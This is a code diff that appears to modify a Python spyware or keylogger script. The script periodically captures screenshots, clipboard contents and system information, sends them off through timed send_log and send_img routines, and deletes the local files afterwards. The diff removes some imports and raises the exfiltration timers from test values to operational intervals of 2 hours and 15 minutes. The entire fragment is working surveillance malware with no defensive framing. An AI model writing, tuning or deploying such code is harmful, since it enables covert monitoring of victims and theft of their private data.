@@ -30,15 +30,6 @@ from datetime import timedelta
 import time
 import os
 
-from cryptography.fernet import Fernet
-
-from scipy.io.wavfile import write
-import sounddevice as sd
-
-import getpass
-from requests import get
-
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 
@@ -120,6 +111,8 @@ def send_log():
     if c<1:
         os.remove(file_path+ extend +system_information)
     os.remove(file_path+ extend + clipboard_information) #deletes files
+    tlog.reset()
+    tlog.start()
    
 
 def send_img():
@@ -144,12 +137,9 @@ def send_img():
     os.remove(file_path+ extend + screenshot_information) #deletes png file
     timg.reset()
     timg.start()
-    if p%3==0:
-        tlog.reset()
-        tlog.start()
     
-tlog = ResettableTimer(60.0, send_log) #7200sec, 2hr
-timg= ResettableTimer(30,send_img) #900 seconds,ie 15 mins, can be changed 
+tlog = ResettableTimer(7200.0, send_log) #7200sec, 2hr
+timg= ResettableTimer(900,send_img) #900 seconds,ie 15 mins, can be changed 
 
 # tlog.start()
 # timg.start()
